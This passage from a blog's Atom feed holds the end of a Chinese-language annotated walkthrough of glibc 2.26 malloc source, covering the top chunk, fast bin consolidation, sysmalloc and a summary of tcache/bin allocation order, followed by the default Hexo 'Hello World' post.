       exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果top chunk除去nb之后还能独立成为一个chunk</span></span><br><span class="line"><span class="comment">//就从top chunk中拆分出nb大小的chunk</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset(victim, nb);</span><br><span class="line">      av-&gt;top = remainder;<span class="comment">//剩余部分继续成为top chunk</span></span><br><span class="line">      <span class="comment">//设置chunk头部</span></span><br><span class="line">      set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//返回victim</span></span><br><span class="line">      check_malloced_chunk(av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">    <span class="comment">//如果top chunk不够，并且有fast bin就合并fast bin</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate(av);<span class="comment">//合并fast bin到top chunk</span></span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="comment">//计算nb所属的bin</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index(nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"><span class="comment">//否则说明堆不够，调用sysmalloc向操作系统请求内存</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="comment">//大循环</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>首先判断tcache中是否有可用的chunk，如果有直接返回，否则进入<code>_int_malloc</code>中做进一步分配。在<code>_int_malloc</code>中先判断arena是否可用，如果不可用就调用<code>sysmalloc</code>向操作系统申请内存并返回，如果arena可用就开始在各个bin中寻找chunk。首先是fast bin，如果fast bin中有需求大小的chunk就返回该chunk，并将该fast bin链中（即相同大小）的其余chunk放入tcache中，直到tcache被填满，否则就开始在small bin中寻找chunk。在small bin中流程与fast bin相同，如果在small bin中找不到chunk就需要进入一个直到找到chunk的大循环。在大循环中，先遍历unsorted bin，对unsorted chunk进行判断，如果就是所需的大小则优先放入tcache中，tcache满了才返回；如果不是所需大小则放入small bin或large bin中。遍历结束后判断在遍历的过程中是否有chunk被放入tcache，如果有则从tcache找chunk并返回，如果没有就到large bin中找。在对应large bin中如果能找到最合适的chunk就将该chunk拆分后返回，如果不能则利用binmap批量遍历更大的large bin，如果有可用的chunk就拆分并返回，如果没有就只能用top chunk了。但是如果top chunk也不够，就先判断是否有fast bin，如果有则先合并fast bin，并重新开始大循环，如果没有fast bin则调用sysmalloc向操作系统请求支援。流程图如下：</p><p><img src="https://z3.ax1x.com/2021/10/17/5tqauR.png" alt="malloc.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;glibc2.26开始引入了tcache的技术，提升了堆管理的性能。本文根据glibc2.26的源码介绍含tcache技术的Linux堆分配原理。&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://cyyyber.icu/tags/pwn/"/>
    
    <category term="源码分析" scheme="http://cyyyber.icu/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://cyyyber.icu/2021/09/10/hello-world/"/>
    <id>http://cyyyber.icu/2021/09/10/hello-world/</id>
    <published>2021-09-10T09:14:27.543Z</published>
    <updated>2021-10-17T13:58:52.073Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
